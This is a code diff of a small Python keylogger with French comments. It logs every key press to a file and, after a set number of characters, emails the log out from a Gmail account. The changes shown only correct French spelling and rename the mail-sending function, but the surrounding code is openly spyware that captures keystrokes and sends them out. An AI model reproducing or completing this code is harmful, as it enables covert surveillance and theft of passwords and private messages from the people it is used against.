@@ -9,8 +9,8 @@ i = 0
 file = "touch.txt"
 logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")
 
-#fonction de l'envoie du mail
-def envoie():
+#fonction de l'envoi du mail
+def envoi():
     
     #info à renseigner
     sender_email = "mail@gmail.com"
@@ -45,15 +45,15 @@ def on_press(key):
     print(key)
     compte()
 
-#ajoute 1 à i lorsque une lettre est taper
+#ajoute 1 à i lorsque une lettre est tapée
 def compte():
-    global i, envoie
+    global i, envoi
     i = i+1
 
-    #si le nombre de caractère taper est égale ou sup a se qui est indiquer
+    #si le nombre de caractère tapé est égale ou sup a se qui est indiquer
     if i >= lenght_chars:
         print("envoi!!")
-        envoie()
+        envoi()
     
 
 with Listener(on_press=on_press) as listener:
